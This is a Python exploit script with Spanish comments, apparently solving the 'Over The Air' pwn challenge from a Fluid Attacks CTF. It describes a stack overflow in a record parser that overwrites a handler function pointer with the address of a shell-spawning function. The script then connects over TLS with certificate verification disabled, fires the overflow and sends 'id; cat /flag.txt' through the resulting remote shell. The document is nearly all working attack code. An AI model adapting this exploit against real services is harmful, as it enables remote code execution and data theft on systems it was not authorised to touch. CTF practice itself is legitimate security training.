#!/usr/bin/env python3
# Over The Air (Fluid Attacks CTF 2026, Pwn) -- stack overflow -> sobrescribir function pointer.
# Uso:    ./ota_stack_overflow_pwn.py <host> [port]
# Ejemplo: ./ota_stack_overflow_pwn.py <inst>.chal.ctf.ae 443
#
# Parser de records: type(u8) len(u16 BE) value. La longitud se valida contra el buffer de ENTRADA
# (<=0x200) pero el memcpy copia a un buffer INTERNO menor (rbp-0x270), adyacente al puntero del
# handler de "ack" (rbp-0x228) -> offset 0x48. El record tipo 3 (commit) invoca `call rdx`.
# Binario NO-PIE con factory_console() que hace execl("/bin/sh") @ 0x4012d0 -> RCE sin ROP ni leak.
# El binario es x86-64: si el host es aarch64 no hay dry-run, se valida el offset por disasm estatico.

import sys, ssl, socket, struct

HOST = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443

OFFSET       = 0x48
FACTORY_CON  = 0x4012d0      # funcion del binario que hace execl("/bin/sh")

def record(rtype: int, value: bytes) -> bytes:
    return struct.pack(">BH", rtype, len(value)) + value

manifest = record(2, b"A" * OFFSET + struct.pack("<Q", FACTORY_CON))   # desborda hasta el handler ptr
commit   = record(3, b"")                                              # dispara call rdx

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection((HOST, PORT), timeout=15) as raw:
    with ctx.wrap_socket(raw, server_hostname=HOST) as s:
        s.sendall(manifest)
        s.sendall(commit)
        s.settimeout(3)
        buf = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        # una vez con shell: enviar comandos por el mismo socket
        try:
            s.sendall(b"id; cat /flag.txt\n")
            buf += s.recv(4096)
        except Exception:
            pass
        sys.stdout.write(buf.decode(errors="replace"))
